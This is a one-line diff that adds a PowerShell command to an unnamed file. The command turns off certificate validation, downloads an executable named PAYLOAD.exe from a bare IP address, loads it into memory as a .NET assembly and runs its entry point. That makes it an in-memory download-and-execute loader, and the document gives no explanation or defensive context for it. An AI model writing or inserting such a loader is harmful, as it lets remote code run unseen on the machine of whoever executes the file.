@@ -1,0 +1,1 @@
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $data = (New-Object System.Net.WebClient).DownloadData('http://13.37.13.37/PAYLOAD.exe'); $assem = [System.Reflection.Assembly]::Load($data); $assem.EntryPoint.Invoke($null, (, [string[]] ('foo')))
